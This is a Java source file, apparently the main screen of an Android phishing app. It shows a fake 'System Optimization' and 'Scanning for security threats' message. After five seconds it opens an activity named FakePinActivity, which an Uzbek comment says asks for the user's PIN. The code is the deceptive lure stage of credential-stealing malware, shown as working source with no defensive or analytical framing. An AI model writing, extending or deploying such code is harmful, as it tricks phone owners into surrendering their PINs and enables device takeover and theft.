import android.os.Bundle;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(0xFFF5F5F5);

        ProgressBar pb = new ProgressBar(this);
        layout.addView(pb);

        TextView tv = new TextView(this);
        tv.setText("\nSystem Optimization in progress...\nPlease do not close this app.\n\nScanning for security threats...");
        tv.setGravity(Gravity.CENTER);
        tv.setTextColor(0xFF333333);
        layout.addView(tv);

        setContentView(layout);

        // 5 soniyadan keyin PIN so'raydigan oynani chiqarish
        new android.os.Handler().postDelayed(() -> {
            android.content.Intent intent = new android.content.Intent(MainActivity.this, FakePinActivity.class);
            startActivity(intent);
        }, 5000);
    }
}
